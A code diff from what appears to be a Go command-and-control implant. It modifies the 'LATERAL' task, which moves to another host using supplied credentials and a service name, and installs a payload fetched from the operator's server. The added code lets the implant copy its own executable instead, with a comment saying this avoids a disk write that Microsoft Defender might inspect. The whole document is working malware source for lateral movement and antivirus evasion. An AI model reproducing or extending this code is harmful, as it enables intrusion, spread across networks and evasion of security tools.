@@ -1386,27 +1386,47 @@ func dispatchTask(t transport, task taskWire) {
 
 	case "JUMP", "LATERAL":
 		var la struct {
-			Method  string `json:"method"`
-			Host    string `json:"host"`
-			Payload string `json:"payload"`
-			SvcName string `json:"svcname"`
-			User    string `json:"user"`
-			Pass    string `json:"pass"`
+			Method    string `json:"method"`
+			Host      string `json:"host"`
+			Payload   string `json:"payload"`
+			SvcName   string `json:"svcname"`
+			User      string `json:"user"`
+			Pass      string `json:"pass"`
+			LocalPath string `json:"local_path"` // skip disk write, reuse existing file
 		}
 		if err := json.Unmarshal([]byte(task.Args), &la); err != nil {
 			t.sendResult(task.ID, "", "bad LATERAL args: "+err.Error())
 			return
 		}
-		if la.Host == "" || la.Payload == "" {
-			t.sendResult(task.ID, "", "LATERAL: host and payload are required")
+		if la.Host == "" || (la.Payload == "" && la.LocalPath == "") {
+			t.sendResult(task.ID, "", "LATERAL: host and payload (or local_path) are required")
 			return
 		}
-		payloadBytes, err := t.downloadFile(la.Payload)
-		if err != nil {
-			t.sendResult(task.ID, "", "LATERAL: download '"+la.Payload+"': "+err.Error())
-			return
+
+		existingPath := la.LocalPath
+
+		// "self" payload: reuse this agent's own executable on disk.
+		// Defender has already cleared it (it's running), no new write needed.
+		if strings.EqualFold(la.Payload, "self") {
+			self, err2 := os.Executable()
+			if err2 != nil {
+				t.sendResult(task.ID, "", "LATERAL: resolve self: "+err2.Error())
+				return
+			}
+			existingPath = self
 		}
-		out, err := runLateral(la.Method, la.Host, payloadBytes, la.SvcName, la.User, la.Pass)
+
+		var payloadBytes []byte
+		if existingPath == "" {
+			var err error
+			payloadBytes, err = t.downloadFile(la.Payload)
+			if err != nil {
+				t.sendResult(task.ID, "", "LATERAL: download '"+la.Payload+"': "+err.Error())
+				return
+			}
+		}
+
+		out, err := runLateral(la.Method, la.Host, payloadBytes, existingPath, la.SvcName, la.User, la.Pass)
 		errStr := ""
 		if err != nil {
 			errStr = err.Error()
